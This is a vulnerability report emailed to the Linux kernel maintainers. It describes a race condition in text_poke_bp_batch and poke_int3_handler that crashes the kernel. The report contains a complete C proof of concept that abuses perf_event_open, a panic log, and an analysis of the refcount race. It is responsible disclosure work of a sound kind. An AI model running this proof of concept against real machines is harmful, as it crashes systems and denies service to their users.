Return-Path: <linux-kernel+bounces-428917-lists+linux-kernel=lfdr.de@vger.kernel.org>
X-Original-To: lists+linux-kernel@lfdr.de
Delivered-To: lists+linux-kernel@lfdr.de
Received: from sv.mirrors.kernel.org (sv.mirrors.kernel.org [IPv6:2604:1380:45e3:2400::1])
	by mail.lfdr.de (Postfix) with ESMTPS id 56AF89E14FA
	for <lists+linux-kernel@lfdr.de>; Tue,  3 Dec 2024 09:03:26 +0100 (CET)
Received: from smtp.subspace.kernel.org (wormhole.subspace.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by sv.mirrors.kernel.org (Postfix) with ESMTPS id 1FB03282660
	for <lists+linux-kernel@lfdr.de>; Tue,  3 Dec 2024 08:03:25 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id D19BA1ABEB1;
	Tue,  3 Dec 2024 07:58:58 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (1024-bit key) header.d=theori.io header.i=@theori.io header.b="PVtt/WRS"
Received: from mail-pg1-f176.google.com (mail-pg1-f176.google.com [209.85.215.176])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0C2841CF7B8
	for <linux-kernel@vger.kernel.org>; Tue,  3 Dec 2024 07:58:55 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.176
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1733212738; cv=none; b=ED/eaDV/k+V6tGxViervHj9VoUUDbLeAffPdNe7jq4/kry8cU6mY/3OmG1uvJEd5iTuYiHquDj1idE4tK8/PEbHDLMSf1+jwT1PwdA9AnGJArafvRim/Hq7UriW5XbcI0AfrvKQF+4eHK0hlFtQsu0UHPdyFXXlrXU1gzpFEh3k=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1733212738; c=relaxed/simple;
	bh=Pps10WSzWHIEoeBjVtLLEM0I59XcGwZrgMG5jMzJLMA=;
	h=Message-ID:Date:From:To:Cc:Subject:MIME-Version:Content-Type:
	 Content-Disposition; b=QenA4UEZoDJcY2poXeUPGuUPTfv7Di4trTNEA5RY6f4A/coTVQWaMmMcEuz3Z0uWHw4rOG7kepf1eed4BkcQZdXrpxNmFmy0GqnyAocUFZev6158a8iadz9gsYi+7dgAvt5O6q8ajlizgFiLe17M8/o40aCg/k9G0xeUPECZ7f8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=theori.io; spf=pass smtp.mailfrom=theori.io; dkim=pass (1024-bit key) header.d=theori.io header.i=@theori.io header.b=PVtt/WRS; arc=none smtp.client-ip=209.85.215.176
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=theori.io
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=theori.io
Received: by mail-pg1-f176.google.com with SMTP id 41be03b00d2f7-7fc41dab8e3so3448952a12.3
        for <linux-kernel@vger.kernel.org>; Mon, 02 Dec 2024 23:58:55 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=theori.io; s=google; t=1733212735; x=1733817535; darn=vger.kernel.org;
        h=content-disposition:mime-version:subject:cc:to:from:date:message-id
         :from:to:cc:subject:date:message-id:reply-to;
        bh=GWhxmaaNXjngt6NK0g4afytE6jUb1nSnXkSafOMJY5c=;
        b=PVtt/WRSA5gLBywBGRJWQZ0mH5jASUnjlRPvFCJDO/s43v8vWucYa1LBtWd+7HoTqT
         74phHYN8lsT1vEW2+o5xv+uy1NshVbUk7VyCn5wy/zl90AeFULjeNyLwkshvcf6eqhRg
         MDjPA4G5hWbPO/3PdEmbHJjru4BBVBvoDM5SA=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1733212735; x=1733817535;
        h=content-disposition:mime-version:subject:cc:to:from:date:message-id
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=GWhxmaaNXjngt6NK0g4afytE6jUb1nSnXkSafOMJY5c=;
        b=nXxH0Xbom8d8s10sluCuMmmTrKVfpUgqB0fPZagd0+dTNUn+bWp2NEqJXgw4jhvpqO
         7dmC/XX8/LvUXR45jU6+cMvwDquF1ZC9zWaGde4hoW+hHd4QxRkr9/80CBnIAD6/YbjT
         QVr81pQRntFNRcRt/Kn8IgYAkTgNwnRuD6j8Njxy5NKDK0RPK3jTS1UWAPTg6Uea8CU6
         QEFQ27RuDFBZ5kf+NPO+LbUdbJuCZ0kgSo+7JAeNSNHRq1TePocrAtUtF6LGaiRDn3sE
         tg2KWOerL1dHujQnBDjmtaxlnyhc4X2G+XzQR58sO0kpZhGFirQ8x2WVBFsAwcDnRkx3
         LNZw==
X-Forwarded-Encrypted: i=1; AJvYcCUeTBaaMMWUqz/WTjwJ6Br37myUmLxOjjY+rudDP2RNTbs2dzAaeP5gNPJov8cqS+0rfsMfrvkD0D03MZU=@vger.kernel.org
X-Gm-Message-State: AOJu0YwEv4FelCEEUwTeidqJPBN4eNDjPQm/v1+dM+tMPpuFvOP+wpzi
	JmAEaWNFGj7mUWjjO+Jbkn13kRVLatk87ci2nKj8Tca067FEfJ0psycfvvwzaQs=
X-Gm-Gg: ASbGncsEtPaaIgJTDyIvqXAo27HTWbiYMhcSnTUsk6pNzEfQO2THJDCElMH/lbN2itJ
	jgkIsOxK3TfPNhdyWi5Y50+ABUHCoMLyhi2p9w+LOrvbN8BnwkgCUC29nRgp2OgYu1mx6QoxRaS
	d1KgJGntFlHjM42TS0/MKtYFHVAJOFNx9+WoshQaF6Tg8eDOFp8mXfHwQ88RaBFGXFSp9tgFh08
	h2qDSbwTp0ADfK2/T9gXUPJiCQkZMR1FuEup3k=
X-Google-Smtp-Source: AGHT+IFgsZTICEheeIseon8aoc/pwDYK21VDaMGf6sC/zyR6KSDu95o1dcPh/kaAQlEjpE4zg4draw==
X-Received: by 2002:a05:6a20:a110:b0:1dc:37a:8dc0 with SMTP id adf61e73a8af0-1e1653c827emr2442615637.21.1733212735262;
        Mon, 02 Dec 2024 23:58:55 -0800 (PST)
Received: from msh. ([128.134.106.148])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-725417612fesm9806671b3a.14.2024.12.02.23.58.52
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 02 Dec 2024 23:58:54 -0800 (PST)
Message-ID: <674eba3e.620a0220.127f52.7e92@mx.google.com>
X-Google-Original-Message-ID: <Z066OqZriVlz/YDf@msh.>
Date: Tue, 3 Dec 2024 16:58:50 +0900
From: Seohyeon Maeng <msh1307@theori.io>
To: tglx@linutronix.de, mingo@redhat.com, bp@alien8.de,
	dave.hansen@linux.intel.com, x86@kernel.org
Cc: hpa@zytor.com, peterz@infradead.org, jgross@suse.com, leitao@debian.org,
	linux-kernel@vger.kernel.org, msh1307@theori.io,
	bioloidgp@gmail.com
Subject: [Report] Race Condition in text_poke_bp_batch/poke_int3_handler
Precedence: bulk
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Dear Maintainers,

This email reports a race condition vulnerability that causes a Denial-of-Service (DoS) in the Linux kernel.

While testing on a system with a 4-core CPU and 4GB of RAM, I observed that executing the attached Proof of Concept (PoC) reliably triggers a kernel panic under the specified conditions.

#define _GNU_SOURCE 
#include <linux/perf_event.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sched.h>
#include <pthread.h>
#include <string.h>
#include <sys/ioctl.h>

#define NUM_THREADS 8

static long perf_event_open(struct perf_event_attr *hw_event, pid_t pid, int cpu, int group_fd, int flags){
    return syscall(SYS_perf_event_open, hw_event, pid, cpu, group_fd, flags);
}

inline static int _pin_to_cpu(int id) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(id, &set);
    return sched_setaffinity(getpid(), sizeof(set), &set);
}

void* perf_event_task(void* arg) {
    int cpu_id = *((int*)arg);

    if (_pin_to_cpu(cpu_id) != 0) {
        perror("Failed to set CPU affinity");
        pthread_exit(NULL);
    }

    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_PAGE_FAULTS;
    pe.disabled = 0;
    pe.exclude_kernel = 1;
    pe.exclude_hv = 1;
    pe.read_format = PERF_FORMAT_GROUP | PERF_FORMAT_ID | PERF_FORMAT_LOST;
    pe.inherit = 1;
    pe.inherit_stat = 1;

    while (1) {
        int group_leader = perf_event_open(&pe, 0, -1, -1, 0);
        close(group_leader);
        sched_yield();
    }

    return NULL;
}

int main(void) {
    pthread_t threads[NUM_THREADS];
    int cpu_ids[NUM_THREADS];
    int i;

    for (i = 0; i < NUM_THREADS; i++) {
        cpu_ids[i] = i % sysconf(_SC_NPROCESSORS_ONLN); 
        if (pthread_create(&threads[i], NULL, perf_event_task, &cpu_ids[i]) != 0) {
            perror("Failed to create thread");
            exit(EXIT_FAILURE);
        }
    }

    for (i = 0; i < NUM_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    return 0;
}

The PoC demonstrates how this issue can be exploited to cause a DoS scenario.
Running the PoC under the specified conditions reliably triggers a kernel panic over time

~ $ ./a.out 
[   24.727144] Oops: int3: 0000 [#1] PREEMPT SMP NOPTI
[   24.729582] CPU: 0 UID: 0 PID: 8 Comm: kworker/0:0 Not tainted 6.12.0-rc4-00003-g6fad274f06f0 #1
[   24.729808] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[   24.730160] Workqueue:  0x0 (events)
[   24.732854] RIP: 0010:__schedule+0x342/0x8f0
[   24.733886] Code: 48 29 c1 49 01 8c 24 60 04 00 00 4d 85 ed 74 0f 49 01 8d 30 0c 00 00 49 83 85 4
[   24.734418] RSP: 0018:ffffc9000004be48 EFLAGS: 00000016
[   24.734462] RAX: 00000005c1bc7f6e RBX: 0000000000000000 RCX: 000000000005704a
[   24.734507] RDX: 00000005c1c1efb8 RSI: ffff88813bc2d6c0 RDI: 0000000000000000
[   24.734527] RBP: ffffc9000004bea8 R08: 0000000000000800 R09: 0000000000000001
[   24.734543] R10: 0000000000000002 R11: 0000000000000157 R12: ffff8881001ad700
[   24.734557] R13: ffff88813bc2d640 R14: ffff88810013cf40 R15: ffff888100196580
[   24.734614] FS:  0000000000000000(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
[   24.734644] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   24.734656] CR2: 00007f089b250658 CR3: 00000001001be000 CR4: 00000000000006f0
[   24.734743] Call Trace:
[   24.735508]  <TASK>
[   24.735841]  ? die+0x32/0x90
[   24.735946]  ? exc_int3+0x10f/0x120
[   24.735958]  ? asm_exc_int3+0x39/0x40
[   24.735995]  ? __schedule+0x342/0x8f0
[   24.736011]  ? __schedule+0x342/0x8f0
[   24.736021]  ? __schedule+0x203/0x8f0
[   24.736031]  ? queue_delayed_work_on+0x53/0x60
[   24.736060]  schedule+0x22/0xd0
[   24.736281]  worker_thread+0x1a2/0x3b0
[   24.736304]  ? __pfx_worker_thread+0x10/0x10
[   24.736317]  kthread+0xd1/0x100
[   24.736330]  ? __pfx_kthread+0x10/0x10
[   24.736340]  ret_from_fork+0x2f/0x50
[   24.736353]  ? __pfx_kthread+0x10/0x10
[   24.736365]  ret_from_fork_asm+0x1a/0x30
[   24.736422]  </TASK>
[   24.736462] Modules linked in:
[   24.736968] ---[ end trace 0000000000000000 ]---
[   24.737006] Oops: int3: 0000 [#2] PREEMPT SMP NOPTI
[   24.737169] RIP: 0010:__schedule+0x342/0x8f0
[   24.737190] Code: 48 29 c1 49 01 8c 24 60 04 00 00 4d 85 ed 74 0f 49 01 8d 30 0c 00 00 49 83 85 4
[   24.737198] RSP: 0018:ffffc9000004be48 EFLAGS: 00000016
[   24.737210] RAX: 00000005c1bc7f6e RBX: 0000000000000000 RCX: 000000000005704a
[   24.737216] RDX: 00000005c1c1efb8 RSI: ffff88813bc2d6c0 RDI: 0000000000000000
[   24.737221] RBP: ffffc9000004bea8 R08: 0000000000000800 R09: 0000000000000001
[   24.737226] R10: 0000000000000002 R11: 0000000000000157 R12: ffff8881001ad700
[   24.737230] R13: ffff88813bc2d640 R14: ffff88810013cf40 R15: ffff888100196580
[   24.737237] FS:  0000000000000000(0000) GS:ffff88813bc00000(0000) knlGS:0000000000000000
[   24.737244] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   24.737249] CR2: 00007f089b250658 CR3: 00000001001be000 CR4: 00000000000006f0
[   24.737399] Kernel panic - not syncing: Fatal exception in interrupt
[   30.673416] Shutting down cpus with NMI
[   30.674903] Kernel Offset: disabled


I have identified a race condition occurring in the text_poke_bp_batch function in the Linux kernel. This issue arises when performance events are repeatedly created and deleted, leading to the activation and deactivation of static branches. The following call stack illustrates the process:

__do_sys_perf_event_open
  perf_event_alloc
    perf_swevent_init
      static_key_slow_inc
        jump_label_update
          arch_jump_label_transform_apply
            text_poke_finish
              text_poke_flush
                text_poke_bp_batch

Ultimately, this leads to a call to text_poke_bp_batch. The context switching is managed by the __schedule function, specifically in prepare_task_switch, where perf_event_task_sched_out is invoked.

A kernel panic occurs when the following code is executed during live patching. In this scenario, an int3 trap can be triggered.

static inline void perf_event_task_sched_out(struct task_struct *prev,
					     struct task_struct *next)
{
	[...]
	if (static_branch_unlikely(&perf_sched_events))
		__perf_event_task_sched_out(prev, next);
}

noinstr int poke_int3_handler(struct pt_regs *regs)
{
	[...]
	desc = try_get_desc();    // [1]
	if (!desc)
		return 0;
	[...]
	if (unlikely(desc->nr_entries > 1)) {
		tp = __inline_bsearch(ip, desc->vec, desc->nr_entries,
				      sizeof(struct text_poke_loc),
				      patch_cmp);
		if (!tp)
			goto out_put;
	} else {
		tp = desc->vec;
		if (text_poke_addr(tp) != ip)
			goto out_put;
	}
	[...]
out_put:
	put_desc();
	return ret;
}

During the Interrupt Handler (poke_int3_handler) processing, the patch function may be entered, resulting in an improper reference count (refcount). This can cause the reference count to be incorrectly set, and the bp_desc.vec and bp_desc.nr_entries are reinitialized, leading to a loss of critical information and subsequent failures in handling the int3 trap.

static void text_poke_bp_batch(struct text_poke_loc *tp, unsigned int nr_entries)
{	
	[...]
	lockdep_assert_held(&text_mutex);

	bp_desc.vec = tp;
	bp_desc.nr_entries = nr_entries;

	/*
	 * Corresponds to the implicit memory barrier in try_get_desc() to
	 * ensure reading a non-zero refcount provides up to date bp_desc data.
	 */
	atomic_set_release(&bp_desc.refs, 1); // [2]
	[...]	
	/*
	 * Remove and wait for refs to be zero.
	 */
	if (!atomic_dec_and_test(&bp_desc.refs))   // [3]
		atomic_cond_read_acquire(&bp_desc.refs, !VAL);
	[...]
}

As demonstrated above, bp_desc and its refcount can be modified while poke_int3_handler is executing, leading to unexpected behavior.

Consider a scenario where two CPUs concurrently execute the sequence [1] -> [2] -> [3] -> [1], with overlapping operations on the reference count.
When [3] is executed, the refcount may drop to zero. As a result, when [1] attempts to retrieve the descriptor, it fails, leading to a kernel panic.

To address this issue, I suggest adding a reference count validation mechanism within the interrupt handler to prevent reentrancy. Specifically, the handler should verify the reference count before proceeding and avoid any action if an ongoing operation is detected.

I attempted to address this issue with a patch, but I am not yet fully familiar with the most effective way to resolve it. Nevertheless, I wanted to bring this problem to your attention, as it appears to require further investigation and resolution.

Thank you for your time and consideration in addressing this issue.

Best Regards,
Seohyeon Maeng

